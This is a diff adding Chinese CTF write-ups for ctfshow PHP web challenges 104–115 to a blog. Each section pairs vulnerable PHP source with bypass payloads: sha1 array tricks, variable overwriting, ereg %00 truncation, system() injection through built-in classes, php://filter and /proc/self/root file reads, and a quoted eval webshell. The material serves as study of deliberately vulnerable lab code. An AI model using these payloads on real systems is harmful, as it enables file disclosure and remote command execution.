@@ -164,8 +164,6 @@
                 
                   <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
                 
-                  <li> <a class="main-nav-link" href="/friendly-links">友情链接</a> </li>
-                
                   <li> <a class="main-nav-link" href="/about">About</a> </li>
                 
                   <li><div id="search-form-wrap">
@@ -364,4 +362,718 @@
 
 <h2 id="1-16-Web-104-—-shal-数组-绕过"><a href="#1-16-Web-104-—-shal-数组-绕过" class="headerlink" title="1.16 Web 104 — shal() 数组 [ ] 绕过"></a>1.16 Web 104 — shal() 数组 [ ] 绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">换个姿势</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POS
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1?v2=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1[]=1?v2[]=2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-17-Web-105-—-变量覆盖"><a href="#1-17-Web-105-—-变量覆盖" class="headerlink" title="1.17 Web 105 — 变量覆盖"></a>1.17 Web 105 — 变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);error_reporting(<span class="number">0</span>);<span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;<span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;<span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);    &#125;    <span class="variable">$$key</span>=<span class="variable">$$value</span>;    &#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);    &#125;    <span class="variable">$$key</span>=<span class="variable">$$value</span>;&#125;<span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;    <span class="keyword">die</span>(<span class="variable">$error</span>);&#125;<span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;<span class="keyword">die</span>(<span class="variable">$suces</span>);<span class="meta">?&gt;</span>你还想要flag嘛？</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="variable">$key</span>=$<span class="variable">$value</span>;			<span class="comment">#变量覆盖，将值作为变量赋给键作为变量，如果传入，?suces=flag，即相当于 $suces=$flag，即将$flag的值赋给$suces，所以我只需要想办法 输出 $suces 即可</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/18/V4pOyTZECmWY2B7.png" alt="image-20210718203822905"></p>
+<p>可以看到，仅仅传入以上内容，会显示 $error 报错，我们可以通过 POST传参，将 $flag 的值赋给 $error 即可</p>
+<p><img src="https://i.loli.net/2021/07/18/YGmoRLev1xTq5Wz.png" alt="image-20210718203954650"></p>
+<p>思考</p>
+<ul>
+<li><p>通过 <code>die(suces)</code> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: suces=flagpost: flag=</span><br></pre></td></tr></table></figure></li>
+<li><p>通过 <code>die(error)</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: suces=flagpost: error=suces</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="1-15-Web-106-—-shal-数组-绕过"><a href="#1-15-Web-106-—-shal-数组-绕过" class="headerlink" title="1.15 Web 106 — shal() 数组 [ ] 绕过"></a>1.15 Web 106 — shal() 数组 [ ] 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1[]=1v2[]=2</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-16-Web-107-—-parse-str"><a href="#1-16-Web-107-—-parse-str" class="headerlink" title="1.16 Web 107 — parse_str()"></a>1.16 Web 107 — parse_str()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;           <span class="keyword">echo</span> <span class="variable">$flag</span>;       &#125;&#125;<span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#parse_str($v1,$v2);把$1字符串解析到变量 $2当中，以数组形式get: ?v3=123456post: v1=flag=e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/18/54Y8EOvFWDByebl.png" alt="image-20210718205544680"></p>
+<h2 id="1-17-Web-108-—-ereg-截断漏洞"><a href="#1-17-Web-108-—-ereg-截断漏洞" class="headerlink" title="1.17 Web 108 — ereg() 截断漏洞"></a>1.17 Web 108 — ereg() 截断漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);&#125;<span class="comment">//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;<span class="meta">?&gt;</span>error</span></span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#strrev()反转字符串#intval()获取变量整数值#0x36d 的十进制是 877</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg() 存在00截断漏洞，即%00之后的内容不会进行匹配函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回<span class="literal">true</span>,否则,则返回<span class="literal">false</span>。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=sds%00778</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-18-Web-109-—-v1-v2-内置类"><a href="#1-18-Web-109-—-v1-v2-内置类" class="headerlink" title="1.18 Web 109 — $v1($v2()) 内置类"></a>1.18 Web 109 — $v1($v2()) 内置类</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#随便找个php中的内置类并且可以直接echo输出的就可以ExceptionReflectionClass?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)?v1=Exception&amp;v2=system(&#x27;ls&#x27;)?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=av1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-19-Web-110-—-new-v1-v2"><a href="#1-19-Web-110-—-new-v1-v2" class="headerlink" title="1.19 Web 110 — new $v1($v2())"></a>1.19 Web 110 — new $v1($v2())</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);    &#125;    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FilesystemIterator类读取文件?v1=FilesystemIterator&amp;v2=getcwd</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-20-Web-111-—-变量覆盖-—-GLOBALS"><a href="#1-20-Web-111-—-变量覆盖-—-GLOBALS" class="headerlink" title="1.20 Web 111 — 变量覆盖 — $GLOBALS"></a>1.20 Web 111 — 变量覆盖 — $GLOBALS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量覆盖</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);    var_dump(<span class="variable">$$v1</span>);&#125;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);    &#125;    &#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>超全局变量 <code>$GLOBALS</code></p>
+<ul>
+<li><p>$GLOBALS — 引用全局作用域中可用的全部变量</p>
+</li>
+<li><p>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
+</li>
+</ul>
+<p><img src="https://i.loli.net/2021/08/02/lk3Cv7n8eOghUxq.png" alt="image-20210802083706337"></p>
+<p><img src="https://i.loli.net/2021/08/02/jsdzfwvOeMl69aU.png" alt="image-20210802083840803"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123;  [<span class="string">&quot;_GET&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_POST&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_COOKIE&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_FILES&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;GLOBALS&quot;</span>]=&gt;  array(8) &#123;    [<span class="string">&quot;_GET&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_POST&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_COOKIE&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_FILES&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;GLOBALS&quot;</span>]=&gt;    *RECURSION*    [<span class="string">&quot;a&quot;</span>]=&gt;    int(123)    [<span class="string">&quot;b&quot;</span>]=&gt;    int(456)    [<span class="string">&quot;c&quot;</span>]=&gt;    string(4) <span class="string">&quot;asdf&quot;</span>  &#125;  [<span class="string">&quot;a&quot;</span>]=&gt;  int(123)  [<span class="string">&quot;b&quot;</span>]=&gt;  int(456)  [<span class="string">&quot;c&quot;</span>]=&gt;  string(4) <span class="string">&quot;asdf&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=ctfshow&amp;v2=GLOBALS# 将 $GLOBALS 赋值给 v2 , v2 再赋值给 v1 , 然后再 var_dump($v1)，就相当于 var_dump($GLOBALS)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-21-Web-112-—-各种编码绕过-convert-iconv-UCS-2LE-UCS-2BE"><a href="#1-21-Web-112-—-各种编码绕过-convert-iconv-UCS-2LE-UCS-2BE" class="headerlink" title="1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE"></a>1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&quot;hacker!&quot;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpecho iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;</span>);<span class="comment"># ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php# 得到 f$al=gc&quot;fthswod&#123;3c00bd-8cf124-2b-53b4da-72598e1bb4&#125;7;&quot;# 解码得到 flag</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另解?file=php://filter/resource=flag.php?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php#?file=compress.bzip2://flag.php# 别的一些编码绕过?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-22-Web-113-—-proc-self-root-多次重复"><a href="#1-22-Web-113-—-proc-self-root-多次重复" class="headerlink" title="1.22 Web 113 — /proc/self/root 多次重复"></a>1.22 Web 113 — /proc/self/root 多次重复</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&#x27;hacker!&#x27;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤 filter 可使用 zlib?file=compress.zlib://flag.php</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另解?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php# /proc/self/root 在 Linux 当中是指向根目录的  多次重复可绕过# ls /proc/self/root 得到的将会是根目录的文件</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-23-Web-114-—-filter"><a href="#1-23-Web-114-—-filter" class="headerlink" title="1.23 Web 114 — filter"></a>1.23 Web 114 — filter</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);	<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&#x27;hacker!&#x27;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="built_in">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125; 师傅们居然tql都是非预期 哼！</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filter 未被过滤?file=php://filter/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-24-Web-115-—-trim-0c-绕过"><a href="#1-24-Web-115-—-trim-0c-绕过" class="headerlink" title="1.24 Web 115 — trim() %0c 绕过"></a>1.24 Web 115 — trim() %0c 绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&#x27;flag.php&#x27;</span>);highlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$num</span>)&#123;    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="built_in">return</span> <span class="variable">$num</span>;&#125;<span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];<span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) and <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> and trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> and filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;        <span class="built_in">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">echo</span> <span class="string">&quot;hacker!!&quot;</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;&#125; hacker!!!</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/DmW7bvf2sIPgEi3.png" alt="image-20210802092037807"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试&lt;?phpfor ($i=0; $i &lt;=128 ; $i++) &#123;     $x=chr($i).&#x27;1&#x27;;   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;        echo urlencode(chr($i)).&quot;\n&quot;;   &#125;&#125;# %0C %2B - . 0 1 2 3 4 5 6 7 8 9 </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure>
+
